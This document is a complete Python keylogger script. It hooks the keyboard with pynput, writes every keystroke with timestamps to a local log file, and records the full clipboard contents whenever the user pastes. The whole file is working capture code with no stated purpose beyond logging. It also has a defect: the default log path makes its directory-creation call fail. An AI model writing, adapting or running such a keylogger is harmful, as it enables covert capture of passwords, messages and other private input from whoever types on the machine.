import sys
import os
import time
import threading
from datetime import datetime
from pynput import keyboard
import pyperclip

log_path = sys.argv[1] if len(sys.argv) > 1 else "keylog_output.txt"
os.makedirs(os.path.dirname(log_path), exist_ok=True)

buffer = ""
last_flush_time = time.time()
flush_interval = 3  # seconds
last_key_time = time.time()
break_threshold = 2  # seconds without typing = new line with timestamp
lock = threading.Lock()

# Mapping special key names to readable forms
SPECIAL_KEYS = {
    keyboard.Key.enter: "\n",
    keyboard.Key.space: " ",
    keyboard.Key.tab: "\t",
    keyboard.Key.backspace: "<BACKSPACE>",
    keyboard.Key.esc: "<ESC>",
}

ctrl_pressed = False
shift_pressed = False
clipboard_before = ""

def flush_buffer():
    global buffer, last_flush_time
    if not buffer.strip():
        return

    with lock:
        with open(log_path, "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("[%H:%M:%S] ")
            f.write(f"{timestamp}{buffer}\n")
            buffer = ""
            last_flush_time = time.time()

def on_press(key):
    global buffer, last_key_time, ctrl_pressed, shift_pressed, clipboard_before
    try:
        now = time.time()
        if now - last_key_time > break_threshold:
            flush_buffer()

        # Modifier keys
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            ctrl_pressed = True
            clipboard_before = pyperclip.paste()
            return
        if key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            shift_pressed = True
            return

        # Update clipboard_before if Ctrl+C or Ctrl+X is pressed
        if isinstance(key, keyboard.KeyCode) and key.char:
            if ctrl_pressed and key.char.lower() in ['c', 'x']:
                clipboard_before = pyperclip.paste()
                return

        # Detect paste event via Ctrl+V
        if isinstance(key, keyboard.KeyCode) and key.char and key.char.lower() == 'v' and ctrl_pressed:
            pasted = pyperclip.paste()
            if pasted and pasted != clipboard_before:
                flush_buffer()
                timestamp = datetime.now().strftime("[%H:%M:%S] ")
                with lock:
                    with open(log_path, "a", encoding="utf-8") as f:
                        f.write(f"{timestamp}<PASTE: {pasted}>\n")
            ctrl_pressed = False
            return

        if isinstance(key, keyboard.KeyCode):
            char = key.char
            if char and char.isprintable():
                buffer += char.lower()
        elif key in SPECIAL_KEYS:
            buffer += SPECIAL_KEYS[key]

    except Exception:
        pass

    last_key_time = time.time()

def on_release(key):
    global ctrl_pressed, shift_pressed
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = False
    if key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
        shift_pressed = False

def periodic_flusher():
    while True:
        time.sleep(1)
        if time.time() - last_flush_time > flush_interval:
            flush_buffer()

threading.Thread(target=periodic_flusher, daemon=True).start()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
